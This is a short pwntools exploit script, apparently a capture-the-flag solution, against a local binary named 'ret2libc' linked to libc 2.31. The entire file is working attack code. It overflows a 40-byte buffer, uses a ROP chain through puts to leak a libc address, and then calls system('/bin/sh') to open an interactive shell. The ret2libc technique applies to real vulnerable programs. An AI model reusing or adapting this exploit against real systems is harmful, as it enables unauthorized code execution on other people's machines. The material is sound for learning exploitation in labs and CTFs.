from pwn import *

#init

e = ELF('./ret2libc')
libc = ELF('./libc-2.31.so')

p = process(e.path)

#vars

learn = e.symbols['learn']
puts_got = e.got['puts']
puts_plt = e.plt['puts']
puts_off = libc.symbols['puts']
system_off = libc.symbols['system']
binsh_off = next(libc.search(b'/bin/sh')) 
pop_rdi = 0x40154b 

log.info('Learn adr: ' + hex(learn))
log.info('Puts got adr: ' + hex(puts_got))
log.info('Puts plt adr: ' + hex(puts_plt))
log.info('Puts libc off: ' + hex(puts_off))
log.info('System libc off: ' + hex(system_off))
log.info('Binsh libc off: ' + hex(binsh_off))
log.info('Pop rdi adr: ' + hex(pop_rdi))

#exploit

#leak libc by with rop to puts plt and writing puts got

p.sendlineafter('[Y/N]', b'a' * 40 + p64(pop_rdi + 1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(learn))

p.recvuntil('!\n\n')

libc_off = u64(p.recvline(keepends = False).ljust(8, b'\x00')) - puts_off

log.info('Libc off: ' + hex(libc_off))

#call system('/bin/sh')

p.sendlineafter('[Y/N]', b'a' * 40 + p64(pop_rdi) + p64(libc_off + binsh_off) + p64(libc_off + system_off))

#pray for flag

p.interactive()
